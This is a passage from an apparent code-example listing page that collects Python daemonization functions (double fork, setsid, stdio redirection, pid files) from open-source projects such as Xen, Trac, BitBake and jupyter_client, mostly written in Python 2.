        os.dup2(si.fileno(), sys.stdin.fileno())
    if hasattr(sys.stdout, 'fileno'):
        os.dup2(so.fileno(), sys.stdout.fileno())
    if hasattr(sys.stderr, 'fileno'):
        os.dup2(se.fileno(), sys.stderr.fileno())


 
Example 34
From project kunai-master, under directory kunai, in source file launcher.py.
Score: 8
vote
vote
def daemonize(self):
        logger.debug("Redirecting stdout and stderr as necessary..")
        if self.debug_path:
            fdtemp = os.open(self.debug_path, os.O_CREAT | os.O_WRONLY | os.O_TRUNC)
        else:
            fdtemp = os.open(REDIRECT_TO, os.O_RDWR)

        os.dup2(fdtemp, 1)  # standard output (1)
        os.dup2(fdtemp, 2)  # standard error (2)
        
        # Now the fork/setsid/fork..
        try:
            pid = os.fork()
        except OSError, e:
            s = "%s [%d]" % (e.strerror, e.errno)
            logger.error(s)
            raise Exception, s
        
        if pid != 0:
            # In the father: we check if our child exit correctly
            # it has to write the pid of our future little child..
            def do_exit(sig, frame):
                logger.error("Timeout waiting child while it should have quickly returned ; something weird happened")
                os.kill(pid, 9)
                sys.exit(2)
            # wait the child process to check its return status:
            signal.signal(signal.SIGALRM, do_exit)
            signal.alarm(3)  # forking & writing a pid in a file should be rather quick..
            # if it's not then something wrong can already be on the way so let's wait max 3 secs here.
            pid, status = os.waitpid(pid, 0)
            if status != 0:
                logger.error("Something weird happened with/during second fork: status=", status)
                os._exit(2)
            # In all case we will have to return
            os._exit(0)
        
        # halfway to daemonize..
        os.setsid()
        try:
            pid = os.fork()
        except OSError, e:
            raise Exception, "%s [%d]" % (e.strerror, e.errno)
        if pid != 0:
            # we are the last step and the real daemon is actually correctly created at least.
            # we have still the last responsibility to write the pid of the daemon itself.
            self.write_pid(pid)
            os._exit(0) # <-- this was the son, the real daemon is the son-son
        
        self.fpid.close()
        del self.fpid
        self.pid = os.getpid()
        logger.info("Daemonization done: pid=%d" % self.pid)

        
     
Example 35
From project misc, under directory , in source file pydaemon.py.
Score: 8
vote
vote
def _daemonize(self):
        '''
            This forks the current process into a daemon.
            The stdin, stdout, and stderr arguments are file names that
            will be opened and be used to replace the standard file descriptors
            in sys.stdin, sys.stdout, and sys.stderr.
            These arguments are optional and default to /dev/null.
            Note that stderr is opened unbuffered, so
            if it shares a file with stdout then interleaved output
            may not appear in the order that you expect.
        '''
        # Do first fork.
        try: 
            pid = os.fork() 
            if pid > 0: sys.exit(0) # Exit first parent.
        except OSError, e: 
            sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
            sys.exit(1)

        # Decouple from parent environment.
        os.chdir("/") 
        os.umask(0) 
        os.setsid() 

        # Do second fork.
        try: 
            pid = os.fork() 
            if pid > 0: sys.exit(0) # Exit second parent.
        except OSError, e: 
            sys.stderr.write("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror))
            sys.exit(1)

        # Open file descriptors and print start message
        if not self.stderr: self.stderr = self.stdout
        si = file(self.stdin, 'r')
        so = file(self.stdout, 'a+')
        se = file(self.stderr, 'a+', 0)
        pid = str(os.getpid())
        startmsg = "%s started with pid %s\n"
        sys.stderr.write(startmsg % (self.name, pid))
        sys.stderr.flush()
        if self.pidfile: file(self.pidfile,'w+').write("%s\n" % pid)

        # Redirect standard file descriptors.
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())

     
Example 36
From project freenx, under directory freenx-redesign/server/lib/nxparser, in source file server.py.
Score: 8
vote
vote
def daemonize(self):
    """Drop into the background."""

    # I am assumuing this throws if fork fails.
    pid = os.fork()
    # In the parent, return.
    if pid != 0:
      # self.nxnode_rfile.close()
      # self.nxnode_wfile.close()
      os.close(self.nxnode_commfd)
      # del(self.nxnode_rfile)
      # del(self.nxnode_wfile)
      # del(self.nxnode_commfd)
      nxlog.setup('nxserver-outer')
      nxlog.log(nxlog.LOG_INFO, "Forked child to take care of nxsession stuff")
      return False

    # Dissociate from the nxserver terminal
    os.setsid()

    # If we need to change signal behavior, do it here.

    # Close the stdio fds.
    os.close(0)
    os.close(1)
    os.close(2)

    self.input = self.nxnode_rfile
    self.output = self.nxnode_wfile

    # I'm not sure what to do here with self.nxnode_rfile and self.nxnode_wfile
    # Closing the fd is enough, but the file objects would linger on.
    del(self.nxnode_rfile)
    del(self.nxnode_wfile)
    del(self.nxnode_commfd)

    nxlog.setup('nxserver-inner')
    nxlog.log(nxlog.LOG_INFO, "Successfully forked, "
        "taking care of nxsession stuff\n")
    try:
      self._session_read_loop()
    except Exception:
      trace = traceback.format_exc()
      nxlog.log(nxlog.LOG_ERR, 'Going down because exception caught '
                               'at the top level.')
      for line in trace.split('\n'):
        nxlog.log(nxlog.LOG_ERR, '%s' % line)
    return True

   
Example 37
From project xen, under directory tools/python/xen/util, in source file utils.py.
Score: 8
vote
vote
def daemonize(prog, args, stdin_tmpfile=None):
    """Runs a program as a daemon with the list of arguments.  Returns the PID
    of the daemonized program, or returns 0 on error.
    """
    r, w = os.pipe()
    pid = os.fork()

    if pid == 0:
        os.close(r)
        w = os.fdopen(w, 'w')
        os.setsid()
        try:
            pid2 = os.fork()
        except:
            pid2 = None
        if pid2 == 0:
            os.chdir("/")
            null_fd = os.open("/dev/null", os.O_RDWR)
            if stdin_tmpfile is not None:
                os.dup2(stdin_tmpfile.fileno(), 0)
            else:
                os.dup2(null_fd, 0)
            os.dup2(null_fd, 1)
            os.dup2(null_fd, 2)
            for fd in range(3, 256):
                try:
                    os.close(fd)
                except:
                    pass
            os.execvp(prog, args)
            os._exit(1)
        else:
            w.write(str(pid2 or 0))
            w.close()
            os._exit(0)
    os.close(w)
    r = os.fdopen(r)
    daemon_pid = int(r.read())
    r.close()
    os.waitpid(pid, 0)
    return daemon_pid

# Global variable to store the sysfs mount point
 
Example 38
From project xen, under directory tools/python/xen/xend/server, in source file SrvDaemon.py.
Score: 8
vote
vote
def daemonize(self):
        # Detach from TTY.

        # Become the group leader (already a child process)
        os.setsid()

        # Fork, this allows the group leader to exit,
        # which means the child can never again regain control of the
        # terminal
        if os.fork():
            os._exit(0)

        # Detach from standard file descriptors, and redirect them to
        # /dev/null or the log as appropriate.
        # We open the log file first, so that we can diagnose a failure to do
        # so _before_ we close stderr.
        try:
            parent = os.path.dirname(XEND_DEBUG_LOG)
            mkdir.parents(parent, stat.S_IRWXU)
            fd = os.open(XEND_DEBUG_LOG, os.O_WRONLY|os.O_CREAT|os.O_APPEND, 0666)
        except Exception, exn:
            print >>sys.stderr, exn
            print >>sys.stderr, ("Xend failed to open %s.  Exiting!" %
                                 XEND_DEBUG_LOG)
            sys.exit(1)

        os.close(0)
        os.close(1)
        os.close(2)
        if XEND_DEBUG:
            os.open('/dev/null', os.O_RDONLY)
            os.dup(fd)
            os.dup(fd)
        else:
            os.open('/dev/null', os.O_RDWR)
            os.dup(0)
            os.dup(fd)
        os.close(fd)

        print >>sys.stderr, ("Xend started at %s." %
                             time.asctime(time.localtime()))

        
     
Example 39
From project goove, under directory , in source file updater.py.
Score: 8
vote
vote
def daemonize(args, logger, our_home_dir='.', out_log='/dev/null',
              err_log='/dev/null', umask=022):
    # First fork
    try:
        if os.fork() > 0:
            sys.exit(0)     # kill off parent
    except OSError, e:
        logger.critical("fork #1 failed: (%d) %s" % (e.errno, e.strerror))
        sys.exit(1)
    os.setsid()
    os.chdir(our_home_dir)
    os.umask(umask)
    logger.debug("fork #1 succeeded")

    # Second fork
    try:
        if os.fork() > 0:
            os._exit(0)
    except OSError, e:
        logger.critical("fork #2 failed: (%d) %s" % (e.errno, e.strerror))
        os._exit(1)
    logger.debug("fork #2 succeeded")

    si = open('/dev/null', 'r')
    so = open(out_log, 'a+', 0)
    se = open(err_log, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())
    # Set custom file descriptors so that they get proper buffering.
    sys.stdout, sys.stderr = so, se
    # Write pid to pidfile
    try:
        f = open(args.pid, "wt")
        f.write("%d\n" % os.getpid())
        f.close()
    except IOError, e:
        logger.critical("Cannot write pid file: (%d) %s" % (e.errno, e.strerror))
        os._exit(1)
        
    logger.debug("pid written to %s" % args.pid)

    main(args, logger)


 
Example 40
From project chains-master, under directory lib/chains/daemon, in source file __init__.py.
Score: 8
vote
vote
def fork(self):

        if os.path.exists(self.pidFile):
            with open(self.pidFile, 'r') as f:
                pid = int(f.read())
            # @todo: is this a good way to check if process is alive?
            try:
                os.getpgid(pid)
                print "Already running at PID %s" % pid
                sys.exit(1)
            except OSError, e:
                if e.args[0] == 3: # process not found
                    os.remove(self.pidFile)
                else:
                    raise

        # do the UNIX double-fork magic, see Stevens' "Advanced 
        # Programming in the UNIX Environment" for details (ISBN 0201563177)
        try: 
            pid = os.fork() 
            if pid > 0:
                # exit first parent
                sys.exit(0) 
        except OSError, e: 
            print >>sys.stderr, "fork #1 failed: %d (%s)" % (e.errno, e.strerror) 
            sys.exit(1)
        # decouple from parent environment
        os.chdir('/') # don't prevent unmounting
        os.setsid() 
        os.umask(0) 
        # do second fork
        try: 
            pid = os.fork() 
            if pid > 0:
                # exit from second parent, print eventual PID before
                pf = open(self.pidFile, 'w')
                pf.write("%d"%pid)
                pf.close()
                sys.exit(0) 
        except OSError, e: 
            print >>sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror) 
            sys.exit(1) 
    
        # start the daemon main loop
        #sys.stdout = sys.stderr = log.OutputLog(open(self.logFile, 'a+'))
        self.main()

 
Example 41
From project tizen-distro-master, under directory bitbake/lib/prserv, in source file serv.py.
Score: 8
vote
vote
def daemonize(self):
        """
        See Advanced Programming in the UNIX, Sec 13.3
        """
        try:
            pid = os.fork()
            if pid > 0:
                os.waitpid(pid, 0)
                #parent return instead of exit to give control 
                return pid
        except OSError as e:
            raise Exception("%s [%d]" % (e.strerror, e.errno))

        os.setsid()
        """
        fork again to make sure the daemon is not session leader, 
        which prevents it from acquiring controlling terminal
        """
        try:
            pid = os.fork()
            if pid > 0: #parent
                os._exit(0)
        except OSError as e:
            raise Exception("%s [%d]" % (e.strerror, e.errno))

        os.umask(0)
        os.chdir("/")

        sys.stdout.flush()
        sys.stderr.flush()
        si = file('/dev/null', 'r')
        so = file(self.logfile, 'a+')
        se = so
        os.dup2(si.fileno(),sys.stdin.fileno())
        os.dup2(so.fileno(),sys.stdout.fileno())
        os.dup2(se.fileno(),sys.stderr.fileno())

        # Clear out all log handlers prior to the fork() to avoid calling
        # event handlers not part of the PRserver
        for logger_iter in logging.Logger.manager.loggerDict.keys():
            logging.getLogger(logger_iter).handlers = []

        # Ensure logging makes it to the logfile
        streamhandler = logging.StreamHandler()
        streamhandler.setLevel(logging.DEBUG)
        formatter = bb.msg.BBLogFormatter("%(levelname)s: %(message)s")
        streamhandler.setFormatter(formatter)
        logger.addHandler(streamhandler)

        # write pidfile
        pid = str(os.getpid()) 
        pf = file(self.pidfile, 'w')
        pf.write("%s\n" % pid)
        pf.close()

        self.work_forever()
        self.delpid()
        os._exit(0)

 
Example 42
From project techu-search-server, under directory techu/libraries, in source file daemon.py.
Score: 8
vote
vote
def daemonize(self):
    """
    do the UNIX double-fork magic, see Stevens' "Advanced 
    Programming in the UNIX Environment" for details (ISBN 0201563177)
    http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
    """
    try: 
      pid = os.fork() 
      if pid > 0:
        # exit first parent
        sys.exit(0) 
    except OSError, e: 
      sys.stderr.write("fork #1 failed: %d (%s)\n" % (e.errno, e.strerror))
      sys.exit(1)
  
    # decouple from parent environment
    os.chdir("/") 
    os.setsid() 
    os.umask(0) 
  
    # do second fork
    try: 
      pid = os.fork() 
      if pid > 0:
        # exit from second parent
        sys.exit(0) 
    except OSError, e: 
      sys.stderr.write("fork #2 failed: %d (%s)\n" % (e.errno, e.strerror))
      sys.exit(1) 
  
    # redirect standard file descriptors
      if self.stdout.upper() == 'STDOUT':
        sys.stdout.flush()
        so = file(self.stdout, 'a+')
        os.dup2(so.fileno(), sys.stdout.fileno())
      if self.stderr.upper() == 'STDERR':
        sys.stderr.flush()
        se = file(self.stderr, 'a+', 0)
        os.dup2(se.fileno(), sys.stderr.fileno())
    si = file(self.stdin, 'r')
    os.dup2(si.fileno(), sys.stdin.fileno())
  
    # write pidfile
    atexit.register(self.delpid)
    pid = str(os.getpid())
    file(self.pidfile,'w+').write("%s\n" % pid)
  
   
Example 43
From project trac-mirror, under directory trac/util, in source file daemon.py.
Score: 8
vote
vote
def daemonize(pidfile=None, progname=None, stdin='/dev/null',
              stdout='/dev/null', stderr='/dev/null', umask=022):
    """Fork a daemon process."""
    if pidfile:
        # Check whether the pid file already exists and refers to a still
        # process running
        pidfile = os.path.abspath(pidfile)
        if os.path.exists(pidfile):
            with open(pidfile) as fileobj:
                try:
                    pid = int(fileobj.read())
                except ValueError:
                    sys.exit('Invalid pid in file %s\nPlease remove it to '
                             'proceed' % pidfile)

            try: # signal the process to see if it is still running
                os.kill(pid, 0)
                if not progname:
                    progname = os.path.basename(sys.argv[0])
                sys.exit('%s is already running with pid %s' % (progname, pid))
            except OSError, e:
                if e.errno != errno.ESRCH:
                    raise

        # The pid file must be writable
        try:
            fileobj = open(pidfile, 'a+')
            fileobj.close()
        except IOError, e:
            from trac.util.text import exception_to_unicode
            sys.exit('Error writing to pid file: %s' % exception_to_unicode(e))

    # Perform first fork
    pid = os.fork()
    if pid > 0:
        sys.exit(0) # exit first parent

    # Decouple from parent environment
    os.chdir('/')
    os.umask(umask)
    os.setsid()

    # Perform second fork
    pid = os.fork()
    if pid > 0:
        sys.exit(0) # exit second parent

    # The process is now daemonized, redirect standard file descriptors
    for stream in sys.stdout, sys.stderr:
        stream.flush()
    stdin = open(stdin, 'r')
    stdout = open(stdout, 'a+')
    stderr = open(stderr, 'a+', 0)
    os.dup2(stdin.fileno(), sys.stdin.fileno())
    os.dup2(stdout.fileno(), sys.stdout.fileno())
    os.dup2(stderr.fileno(), sys.stderr.fileno())

    if pidfile:
        # Register signal handlers to ensure atexit hooks are called on exit
        for signum in [signal.SIGTERM, signal.SIGHUP]:
            signal.signal(signum, handle_signal)

        # Create/update the pid file, and register a hook to remove it when the
        # process exits
        def remove_pidfile():
            if os.path.exists(pidfile):
                os.remove(pidfile)
        atexit.register(remove_pidfile)
        with open(pidfile, 'w') as fileobj:
            fileobj.write(str(os.getpid()))


 
Example 44
From project elements, under directory lib/elements/async, in source file server.py.
Score: 5
vote
vote
def __init__ (self, hosts=None, daemonize=False, user=None, group=None, umask=None, chroot=None, long_running=False,
                  loop_interval=1, timeout=None, timeout_interval=10, worker_count=0, channel_count=0,
                  event_manager=None, print_settings=True):
        """
        Create a new Server instance.

        @param hosts            (tuple)     A tuple that contains one or more tuples of host ip/port pairs.
        @param daemonize        (bool)      Indicates that the process should be daemonized.
        @param user             (str)       The process user.
        @param group            (str)       The process group.
        @param umask            (octal)     The process user mask.
        @param chroot           (str)       The root directory into which the process will be forced.
        @param long_running     (bool)      Indicates that each client is long-running and only one client should be
                                            handled at a time per process.
        @param loop_interval    (int/float) The interval between loop calls.
        @param timeout          (int/float) The client idle timeout.
        @param timeout_interval (int)       The interval between checks for client timeouts.
        @param worker_count     (int)       The worker process count.
        @param channel_count    (int)       The communication channel count for each worker.
        @param event_manager    (str)       The event manager.
        @param print_settings   (bool)      Indicates that the server settings should be printed to the console.
        """

        self._channels                 = {}               # worker channels
        self._channel_count            = channel_count    # count of channels to be created
        self._chroot                   = chroot           # process chroot
        self._clients                  = {}               # all active clients
        self._event_manager            = None             # event manager instance
        self._event_manager_modify     = None             # event manager modify method
        self._event_manager_poll       = None             # event manager poll method
        self._event_manager_register   = None             # event manager register method
        self._event_manager_unregister = None             # event manager unregister method
        self._group                    = group            # process group
        self._hosts                    = []               # host client/server sockets
        self._is_daemon                = daemonize        # indicates that this is running as a daemon
        self._is_graceful_shutdown     = False            # indicates that the current shutdown request is graceful
        self._is_listening             = False            # indicates that this process is listening on all hosts
        self._is_long_running          = long_running     # indicates that clients are long-running
        self._is_parent                = True             # indicates that this process is the parent
        self._is_shutting_down         = False            # indicates that this server is shutting down
        self._loop_interval            = loop_interval    # the interval in seconds between calling handle_loop()
        self._parent_pid               = os.getpid()      # the parent process id
        self._print_settings           = print_settings   # indicates that the settings should be printed to the console
        self._timeout                  = timeout          # the timeout in seconds for a client to be removed
        self._timeout_interval         = timeout_interval # the interval in seconds between checking for idle clients
        self._umask                    = umask            # process umask
        self._user                     = user             # process user
        self._worker_count             = worker_count     # count of worker processes
        self._workers                  = []               # list of worker process ids

        # choose event manager
        if hasattr(select, "epoll") and (event_manager is None or event_manager == "epoll"):
            self._event_manager = EPollEventManager

        elif hasattr(select, "kqueue") and (event_manager is None or event_manager == "kqueue"):
            self._event_manager = KQueueEventManager
            self._worker_count  = 0

            if worker_count > 0:
                print "KQueue does not support parent process file descriptor inheritence, " \
                      "so workers have been disabled. If you want that ability, you must use the Select event manager."

        elif hasattr(select, "poll") and (event_manager is None or event_manager == "poll"):
            self._event_manager = PollEventManager

        elif hasattr(select, "select") and (event_manager is None or event_manager == "select"):
            self._event_manager = SelectEventManager

        else:
            raise ServerException("Could not find a suitable event manager for your platform")

        # change directory
        if chroot:
            try:
                os.chroot(chroot)

            except Exception, e:
                raise ServerException("Cannot change directory to '%s': %s" % (chroot, e))

        # change umask
        if umask is not None:
            try:
                os.umask(umask)

            except Exception, e:
                raise ServerException("Cannot set umask to '%s': %s" % (umask, e))

        # daemonize
        if daemonize:
            if not hasattr(os, "fork"):
                raise ServerException("Cannot daemonize, because this platform does not support forking")

            if os.fork():
                os._exit(0)

            os.setsid()

            if os.fork():
                os._exit(0)

            self.handle_post_daemonize()

        # initialize the event manager methods and events
        self._event_manager            = self._event_manager(self)
        self._event_manager_modify     = self._event_manager.modify
        self._event_manager_poll       = self._event_manager.poll
        self._event_manager_register   = self._event_manager.register
        self._event_manager_unregister = self._event_manager.unregister

        # update this server with the proper events
        self.EVENT_READ   = self._event_manager.EVENT_READ
        self.EVENT_WRITE  = self._event_manager.EVENT_WRITE

        # update the client module with the proper events
        client.EVENT_LINGER = self._event_manager.EVENT_LINGER
        client.EVENT_READ   = self._event_manager.EVENT_READ
        client.EVENT_WRITE  = self._event_manager.EVENT_WRITE

        # add all hosts
        if hosts:
            for host in hosts:
                self.add_host(*host)

        # change group
        if group:
            try:
                try:
                    import grp
                except:
                    raise ServerException("Cannot set group, because this platform does not support this feature")

                os.setgid(grp.getgrnam(group).gr_gid)

            except Exception, e:
                raise ServerException("Cannot set group to '%s': %s" % (group, e))

        # change user
        if user:
            try:
                try:
                    import pwd
                except:
                    raise ServerException("Cannot set user, because this platform does not support this feature")

                os.setuid(pwd.getpwnam(user).pw_uid)

            except Exception, e:
                raise ServerException("Cannot set user to '%s': %s" % (user, e))

        # register signal handlers
        if platform.system() != "Windows":
            #signal.signal(signal.SIGCHLD, self.handle_signal)
            signal.signal(signal.SIGHUP,  self.handle_signal)

        signal.signal(signal.SIGINT,  self.handle_signal)
        signal.signal(signal.SIGTERM, self.handle_signal)

    # ------------------------------------------------------------------------------------------------------------------

     
Example 45
From project searchlight-master, under directory searchlight/cmd, in source file control.py.
Score: 5
vote
vote
def do_start(verb, pid_file, server, args):
    if verb != 'Respawn' and pid_file == CONF.pid_file:
        for pid_file, pid in pid_files(server, pid_file):
            if os.path.exists('/proc/%s' % pid):
                print(_("%(serv)s appears to already be running: %(pid)s") %
                      {'serv': server, 'pid': pid_file})
                return
            else:
                print(_("Removing stale pid file %s") % pid_file)
                os.unlink(pid_file)

        try:
            resource.setrlimit(resource.RLIMIT_NOFILE,
                               (MAX_DESCRIPTORS, MAX_DESCRIPTORS))
            resource.setrlimit(resource.RLIMIT_DATA,
                               (MAX_MEMORY, MAX_MEMORY))
        except ValueError:
            print(_('Unable to increase file descriptor limit.  '
                    'Running as non-root?'))
        os.environ['PYTHON_EGG_CACHE'] = '/tmp'

    def write_pid_file(pid_file, pid):
        with open(pid_file, 'w') as fp:
            fp.write('%d\n' % pid)

    def redirect_to_null(fds):
        with open(os.devnull, 'r+b') as nullfile:
            for desc in fds:  # close fds
                try:
                    os.dup2(nullfile.fileno(), desc)
                except OSError:
                    pass

    def redirect_to_syslog(fds, server):
        log_cmd = 'logger'
        log_cmd_params = '-t "%s[%d]"' % (server, os.getpid())
        process = subprocess.Popen([log_cmd, log_cmd_params],
                                   stdin=subprocess.PIPE)
        for desc in fds:  # pipe to logger command
            try:
                os.dup2(process.stdin.fileno(), desc)
            except OSError:
                pass

    def redirect_stdio(server, capture_output):
        input = [sys.stdin.fileno()]
        output = [sys.stdout.fileno(), sys.stderr.fileno()]

        redirect_to_null(input)
        if capture_output:
            redirect_to_syslog(output, server)
        else:
            redirect_to_null(output)

    @gated_by(CONF.capture_output)
    def close_stdio_on_exec():
        fds = [sys.stdin.fileno(), sys.stdout.fileno(), sys.stderr.fileno()]
        for desc in fds:  # set close on exec flag
            fcntl.fcntl(desc, fcntl.F_SETFD, fcntl.FD_CLOEXEC)

    def launch(pid_file, conf_file=None, capture_output=False, await_time=0):
        args = [server]
        if conf_file:
            args += ['--config-file', conf_file]
            msg = (_('%(verb)sing %(serv)s with %(conf)s') %
                   {'verb': verb, 'serv': server, 'conf': conf_file})
        else:
            msg = (_('%(verb)sing %(serv)s') % {'verb': verb, 'serv': server})
        print(msg)

        close_stdio_on_exec()

        pid = os.fork()
        if pid == 0:
            os.setsid()
            redirect_stdio(server, capture_output)
            try:
                os.execlp('%s' % server, *args)
            except OSError as e:
                msg = (_('unable to launch %(serv)s. Got error: %(e)s') %
                       {'serv': server, 'e': e})
                sys.exit(msg)
            sys.exit(0)
        else:
            write_pid_file(pid_file, pid)
            await_child(pid, await_time)
            return pid

    @gated_by(CONF.await_child)
    def await_child(pid, await_time):
        bail_time = time.time() + await_time
        while time.time() < bail_time:
            reported_pid, status = os.waitpid(pid, os.WNOHANG)
            if reported_pid == pid:
                global exitcode
                exitcode = os.WEXITSTATUS(status)
                break
            time.sleep(0.05)

    conf_file = None
    if args and os.path.exists(args[0]):
        conf_file = os.path.abspath(os.path.expanduser(args[0]))

    return launch(pid_file, conf_file, CONF.capture_output, CONF.await_child)


 
Example 46
From project nimbus, under directory backend/workspace/vms/xen, in source file xen_v2.py.
Score: 5
vote
vote
def daemonize(self, func_list, arg_list):

        # all log entries were duplicated without closing here first
        if self.opts.logfilehandler:
            self.opts.logfilehandler.close()

        pid = os.fork()

        if not pid:
            # To become the session leader of this new session and the
            # process group leader of the new process group, we call
            # os.setsid().  The process is also guaranteed not to have 
            # a controlling terminal.
            os.setsid()

            # Fork a second child and exit immediately to prevent zombies.
            # This causes the second child process to be orphaned, making the
            # init process responsible for its cleanup.  And, since the first
            # child is a session leader without a controlling terminal, it's
            # possible for it to acquire one by opening a terminal in the
            # future (System V-based systems).  This second fork guarantees
            # that the child is no longer a session leader, preventing the
            # daemon from ever acquiring a controlling terminal.
            pid = os.fork()

            if (pid != 0):
            # exit() or _exit()?  See below.
                os._exit(0) # Exit parent (the 1st child) of the 2nd child.
        else:
            # exit() or _exit()?
            # _exit is like exit(), but it doesn't call any functions
            # registered with atexit (and on_exit) or any registered signal
            # handlers.  It also closes any open file descriptors.  Using
            # exit() may cause all stdio streams to be flushed twice and any
            # temporary files may be unexpectedly removed.  It's therefore
            # recommended that child branches of a fork() and the parent
            # branch(es) of a daemon use _exit().
            os._exit(0)     # Exit parent of the first child.


        # find max # file descriptors
        maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
        if (maxfd == resource.RLIM_INFINITY):
            maxfd = MAXFD

        # Iterate through and close all file descriptors.
        for fd in range(0, maxfd):
            try:
                os.close(fd)
            except OSError: # ERROR, fd wasn't open to begin with (ignored)
                pass

        # This call to open is guaranteed to return the lowest file
        # descriptor, which will be 0 (stdin), since it was closed above.
        os.open(REDIRECT_TO, os.O_RDWR)

        # Duplicate stdin to stdout and stderr
        os.dup2(0, 1)
        os.dup2(0, 2)

        # ----------------------------------------
        # work below is done in a daemonized mode:
        # ----------------------------------------

        if self.opts.logfilepath:
            ch = logging.FileHandler(self.opts.logfilepath)
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter("%(asctime)s - %(levelname)s - "
                                          "%(name)s (%(lineno)d) - %(message)s")
            ch.setFormatter(formatter)
            log.addHandler(ch)

        for i,func in enumerate(func_list):
            if arg_list[i] == None:
                ret = func()
            else:
                ret = func(arg_list[i])


    ##################
    # addWorkspace() #
    ##################
     
Example 47
From project mozbuilds, under directory mozilla-build/python/Lib/test, in source file test_pty.py.
Score: 5
vote
vote
def test_fork(self):
        debug("calling pty.fork()")
        pid, master_fd = pty.fork()
        if pid == pty.CHILD:
            # stdout should be connected to a tty.
            if not os.isatty(1):
                debug("Child's fd 1 is not a tty?!")
                os._exit(3)

            # After pty.fork(), the child should already be a session leader.
            # (on those systems that have that concept.)
            debug("In child, calling os.setsid()")
            try:
                os.setsid()
            except OSError:
                # Good, we already were session leader
                debug("Good: OSError was raised.")
                pass
            except AttributeError:
                # Have pty, but not setsid()?
                debug("No setsid() available?")
                pass
            except:
                # We don't want this error to propagate, escaping the call to
                # os._exit() and causing very peculiar behavior in the calling
                # regrtest.py !
                # Note: could add traceback printing here.
                debug("An unexpected error was raised.")
                os._exit(1)
            else:
                debug("os.setsid() succeeded! (bad!)")
                os._exit(2)
            os._exit(4)
        else:
            debug("Waiting for child (%d) to finish." % pid)
            # In verbose mode, we have to consume the debug output from the
            # child or the child will block, causing this test to hang in the
            # parent's waitpid() call.  The child blocks after a
            # platform-dependent amount of data is written to its fd.  On
            # Linux 2.6, it's 4000 bytes and the child won't block, but on OS
            # X even the small writes in the child above will block it.  Also
            # on Linux, the read() will raise an OSError (input/output error)
            # when it tries to read past the end of the buffer but the child's
            # already exited, so catch and discard those exceptions.  It's not
            # worth checking for EIO.
            while True:
                try:
                    data = os.read(master_fd, 80)
                except OSError:
                    break
                if not data:
                    break
                sys.stdout.write(data.replace('\r\n', '\n'))

            ##line = os.read(master_fd, 80)
            ##lines = line.replace('\r\n', '\n').split('\n')
            ##if False and lines != ['In child, calling os.setsid()',
            ##             'Good: OSError was raised.', '']:
            ##    raise TestFailed("Unexpected output from child: %r" % line)

            (pid, status) = os.waitpid(pid, 0)
            res = status >> 8
            debug("Child (%d) exited with status %d (%d)." % (pid, res, status))
            if res == 1:
                self.fail("Child raised an unexpected exception in os.setsid()")
            elif res == 2:
                self.fail("pty.fork() failed to make child a session leader.")
            elif res == 3:
                self.fail("Child spawned by pty.fork() did not have a tty as stdout")
            elif res != 4:
                self.fail("pty.fork() failed for unknown reasons.")

            ##debug("Reading from master_fd now that the child has exited")
            ##try:
            ##    s1 = os.read(master_fd, 1024)
            ##except os.error:
            ##    pass
            ##else:
            ##    raise TestFailed("Read from master_fd did not raise exception")

        os.close(master_fd)

        # pty.fork() passed.


 
Example 48
From project jupyter_client-master, under directory jupyter_client, in source file launcher.py.
Score: 5
vote
vote
def launch_kernel(cmd, stdin=None, stdout=None, stderr=None, env=None,
                        independent=False,
                        cwd=None,
                        **kw
                        ):
    """ Launches a localhost kernel, binding to the specified ports.

    Parameters
    ----------
    cmd : Popen list,
        A string of Python code that imports and executes a kernel entry point.

    stdin, stdout, stderr : optional (default None)
        Standards streams, as defined in subprocess.Popen.

    independent : bool, optional (default False)
        If set, the kernel process is guaranteed to survive if this process
        dies. If not set, an effort is made to ensure that the kernel is killed
        when this process dies. Note that in this case it is still good practice
        to kill kernels manually before exiting.

    cwd : path, optional
        The working dir of the kernel process (default: cwd of this process).

    Returns
    -------

    Popen instance for the kernel subprocess
    """

    # Popen will fail (sometimes with a deadlock) if stdin, stdout, and stderr
    # are invalid. Unfortunately, there is in general no way to detect whether
    # they are valid.  The following two blocks redirect them to (temporary)
    # pipes in certain important cases.

    # If this process has been backgrounded, our stdin is invalid. Since there
    # is no compelling reason for the kernel to inherit our stdin anyway, we'll
    # place this one safe and always redirect.
    redirect_in = True
    _stdin = PIPE if stdin is None else stdin

    # If this process in running on pythonw, we know that stdin, stdout, and
    # stderr are all invalid.
    redirect_out = sys.executable.endswith('pythonw.exe')
    if redirect_out:
        blackhole = open(os.devnull, 'w')
        _stdout = blackhole if stdout is None else stdout
        _stderr = blackhole if stderr is None else stderr
    else:
        _stdout, _stderr = stdout, stderr

    env = env if (env is not None) else os.environ.copy()

    encoding = getdefaultencoding(prefer_stream=False)
    kwargs = dict(
        stdin=_stdin,
        stdout=_stdout,
        stderr=_stderr,
        cwd=cwd,
        env=env,
    )

    # Spawn a kernel.
    if sys.platform == 'win32':
        # Popen on Python 2 on Windows cannot handle unicode args or cwd
        cmd = [ cast_bytes_py2(c, encoding) for c in cmd ]
        if cwd:
            cwd = cast_bytes_py2(cwd, sys.getfilesystemencoding() or 'ascii')
            kwargs['cwd'] = cwd

        from .win_interrupt import create_interrupt_event
        # Create a Win32 event for interrupting the kernel
        # and store it in an environment variable.
        interrupt_event = create_interrupt_event()
        env["JPY_INTERRUPT_EVENT"] = str(interrupt_event)
        # deprecated old env name:
        env["IPY_INTERRUPT_EVENT"] = env["JPY_INTERRUPT_EVENT"]

        try:
            from _winapi import DuplicateHandle, GetCurrentProcess, \
                DUPLICATE_SAME_ACCESS, CREATE_NEW_PROCESS_GROUP
        except:
            from _subprocess import DuplicateHandle, GetCurrentProcess, \
                DUPLICATE_SAME_ACCESS, CREATE_NEW_PROCESS_GROUP
        # Launch the kernel process
        if independent:
            kwargs['creationflags'] = CREATE_NEW_PROCESS_GROUP
        else:
            pid = GetCurrentProcess()
            handle = DuplicateHandle(pid, pid, pid, 0,
